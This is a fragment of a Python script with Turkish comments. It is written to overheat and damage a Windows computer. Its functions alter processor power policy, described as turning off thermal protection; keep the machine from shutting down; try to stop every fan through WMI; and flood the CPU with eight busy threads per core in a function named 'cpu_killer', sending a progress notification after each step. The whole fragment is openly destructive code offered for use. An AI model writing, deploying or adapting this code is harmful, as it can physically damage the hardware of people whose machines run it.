# ==========================================
# 1) TERMAL KORUMAYI KAPAT
# ==========================================
def disable_thermal():
    try:
        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True, capture_output=True)
        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True, capture_output=True)
        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True, capture_output=True)
        send_notification("🔥 Termal koruma kapatıldı!")
        return True
    except:
        return False

# ==========================================
# 2) KAPANMAYI ENGELLE
# ==========================================
def prevent_shutdown():
    while True:
        try:
            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
        except:
            pass
        time.sleep(5)
threading.Thread(target=prevent_shutdown, daemon=True).start()
send_notification("🔒 Kapanma engellendi!")

# ==========================================
# 3) FANLARI DURDUR
# ==========================================
def stop_fans():
    try:
        import wmi
        c = wmi.WMI()
        for fan in c.Win32_Fan():
            try:
                fan.SetSpeed(0)
            except:
                pass
        send_notification("🌀 Fanlar durduruldu!")
    except:
        pass

# ==========================================
# 4) CPU ZORLA (MAX - 8 KATI)
# ==========================================
def cpu_killer():
    while True:
        x = 3.14159
        for _ in range(10000000):
            x = x ** 1.00001
            x = x / 1.000001
            x = x * 0.999999
            x = x + 0.000001
        arr = [i ** i for i in range(20000)]
        for _ in range(1000):
            arr.sort()
            arr.reverse()

def start_cpu():
    core_count = multiprocessing.cpu_count()
    thread_count = core_count * 8
    send_notification(f"🧠 CPU: {core_count} çekirdek, {thread_count} thread")
    
    for _ in range(thread_count):
        threading.Thread(target=cpu_killer, daemon=True).start()
    
    send_notification(f"🔥 CPU {thread_count} thread ile zorlanıyor!")

